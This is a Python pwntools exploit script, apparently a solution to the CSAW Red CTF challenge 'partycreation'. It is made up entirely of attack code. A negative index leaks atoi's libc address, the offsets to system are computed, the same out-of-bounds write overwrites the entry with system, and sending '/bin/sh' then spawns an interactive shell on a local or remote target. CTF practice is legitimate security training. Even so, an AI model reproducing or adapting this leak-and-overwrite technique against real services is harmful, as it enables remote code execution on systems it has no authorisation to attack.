
#solve_partycreation.py
#by N4T_20

from pwn import *
from time import sleep

local = True
debug = False
if local:
    if debug:
        p = gdb.debug('./partycreation',
            '''
            break *0x400a65
            break *0x400dc4
            break *0x400d8e
            continue
            ''')
        # 0x4004e1 init
        # 0x401168 runchallenge
        # 0x400a65 createCharacter
        # 0x400dc4 viewCharacter after input
    else:
        #p = process('./partycreation')
        p = remote('localhost',5000)
else:
    p = remote('pwn.red.csaw.io', 5004)


p.recvuntil("> ")
p.send("2\n")
p.recvuntil("? \n")
p.send("-4\n")
p.recvuntil("Name:         ")
ATOI_ADDR = u64(p.recv(6) + "\x00\x00")
print("atoi_local: " + hex(ATOI_ADDR))

if local:
    LIBC_BASE_ADDR = ATOI_ADDR - 0x40730
    SYSTEM_ADDR = LIBC_BASE_ADDR + 0x4f4e0
else:
    LIBC_BASE_ADDR = ATOI_ADDR - 0x40730
    SYSTEM_ADDR = LIBC_BASE_ADDR + 0x4f4e0

print("system is at " + hex(SYSTEM_ADDR))
p.recvuntil("> ")
p.send("3\n")
p.recvuntil("? \n")
p.send("-4\n")
p.recvuntil("name:\n")
p.send(p64(SYSTEM_ADDR)+"\n")
p.recvuntil("Hacking\n>")
p.send("/bin/sh\n")
p.interactive()
